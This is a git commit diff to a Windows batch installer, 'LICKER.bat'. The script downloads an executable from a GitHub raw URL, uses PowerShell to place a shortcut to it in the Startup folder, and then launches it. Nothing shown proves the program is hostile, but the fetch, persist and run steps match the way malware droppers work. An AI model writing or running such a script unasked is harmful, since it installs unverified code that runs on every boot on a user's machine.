725d6eaafeaf4de6a1f262277a8a750edcf75b58
sankarideb1-hue <sankarideb1@gmail.com>
2026-04-26 16:07:46 +0530

    Update LICKER.bat

--- LICKER.bat
+++ LICKER.bat
@@ -1,5 +1,6 @@
 @echo off
 title Lickers Setup
+:: MAKE SURE THIS URL IS EXACTLY CORRECT
 set "EXE_URL=https://raw.githubusercontent.com/sankarideb1-hue/Lickers/main/Licker.exe"
 set "SAVE_PATH=%USERPROFILE%\Licker.exe"
 set "STARTUP_LINK=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Licker.lnk"
@@ -8,20 +9,18 @@ echo ------------------------------------------
 echo   INSTALLING LICKERS...
 echo ------------------------------------------
 
-:: Download the EXE
-curl -L "%EXE_URL%" -o "%SAVE_PATH%"
+:: The "-f" flag helps identify if the URL is actually broken
+curl -f -L "%EXE_URL%" -o "%SAVE_PATH%"
 
 if exist "%SAVE_PATH%" (
     echo [OK] File downloaded successfully.
-    
-    :: Create the startup shortcut using PowerShell
     powershell -Command "$ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut('%STARTUP_LINK%'); $s.TargetPath = '%SAVE_PATH%'; $s.Save()"
-    
     echo [OK] Added to Windows Startup.
     echo ------------------------------------------
-    echo DONE! Licker will run every time you start your PC.
+    echo DONE! Running Licker now...
     start "" "%SAVE_PATH%"
 ) else (
-    echo [ERROR] Download failed. Check your internet connection.
+    echo [ERROR] Download failed. 
+    echo Please check if https://github.com/sankarideb1-hue/Lickers/blob/main/Licker.exe exists.
 )
 pause
